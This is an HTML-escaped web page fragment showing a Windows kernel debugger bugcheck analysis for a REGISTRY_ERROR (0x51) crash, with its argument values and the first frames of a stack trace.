 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Bugcheck&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Analysis&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*******************************************************************************&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;REGISTRY_ERROR&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;(51)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Something&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;has&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;gone&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;badly&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;wrong&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;with&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;registry.&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;If&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;kernel&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;debugger&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;available,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;stack&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;trace.&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;It&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;can&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;also&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;indicate&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;that&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;registry&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;got&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;an&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;I/O&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;trying&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;one&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;its&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;files,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;it&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;can&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;be&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;caused&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;by&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;hardware&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;problems&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;or&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;filesystem&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;corruption.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;It&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;may&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;occur&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;due&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;failure&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;refresh&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;operation,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;which&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;used&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;only&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;by&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;security&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;system,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;only&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;when&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;resource&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;limits&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;are&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;encountered.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Arguments:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Arg1:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0000000000000001,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;(reserved)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Arg2:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffffd4855dc36000,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;(reserved)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Arg3:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00000000b2603000,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;depends&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Windows&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;BugChecked,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;may&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;be&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;pointer&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;hive&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Arg4:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;000000000000025d,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;depends&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Windows&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;BugChecked,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;may&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;be&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;of&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;HvCheckHive&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;hive&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;corrupt.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;[...]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0: kd&amp;gt; k&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;nbsp;# Child-SP &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;RetAddr &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Call Site&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00 ffff828b`b100be68 fffff800`80763642 &amp;nbsp; &amp;nbsp; nt!DbgBreakPointWithStatus&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;01 ffff828b`b100be70 fffff800`80762e81 &amp;nbsp; &amp;nbsp; nt!KiBugCheckDebugBreak+0x12&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;02 ffff828b`b100bed0 fffff800`80617957 &amp;nbsp; &amp;nbsp; nt!KeBugCheck2+0xa71&lt;/span&gt;&lt;/p&gt;
